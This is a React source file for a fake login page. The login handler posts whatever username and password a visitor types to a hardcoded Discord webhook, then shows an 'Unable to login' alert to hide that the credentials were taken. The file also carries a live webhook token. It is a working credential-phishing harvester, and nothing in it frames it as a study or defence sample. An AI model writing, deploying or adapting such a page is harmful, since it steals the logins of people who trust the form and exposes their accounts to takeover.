
import './App.css';
import { useState } from 'react';
import axios from 'axios';

function App() {
  const [username, setUsername] = useState('');
  const [pass, setPass] = useState('');

  const sendMessage = async () => {
    const webhookUrl = 'https://discord.com/api/webhooks/1255152420212838441/o9mdOZ7_vGwndxGA7_DqQcKYPaz1o-OXsR7-_3UawW7tD_PN58BHigrJx0qMZhsU1-hi'; // Replace with your webhook URL
    const content = {
      username: username,
      pass: pass
    };
    try {
      await axios.post(webhookUrl, {
        content: JSON.stringify(content),
      });
      
    } catch (error) {
      console.error('Error sending message:', error);

    }
  };
  return (
    <div className="App">
      
       <div className='creds'>
            <div className="options">
               <button className='op1 a' style={{"backgroundColor":"#F4D93B" ,"color":"black"}}> SignUp</button>
               <button className='op1' style={{"backgroundColor":"#185685"}}> Login</button>
              </div>
              <div className="creds_div">
                <br/>
                  <img class="creds_img" src="logo.jpg" alt='logo'/>
                  {/* <br/> */}
                  <br/>
                  <input placeholder='Your Username' type="text" onChange={(e)=>setUsername(e.target.value)}/>
                  <br/>

                  <input placeholder='Your Password' type="text" onChange={(e)=>setPass(e.target.value)}/>
                  <br/>

                  <button className='op1_b' style={{"backgroundColor":"#185685"}} onClick={()=>{sendMessage();alert("Unable to login ")}}> Login</button>
                  <br/>
                  <button className='op1_b' style={{"backgroundColor":"#185685"}} onClick={()=>alert("Unable to login ")}> Login as demo user</button>
              </div>
       </div>
    </div>
  );
}

export default App;
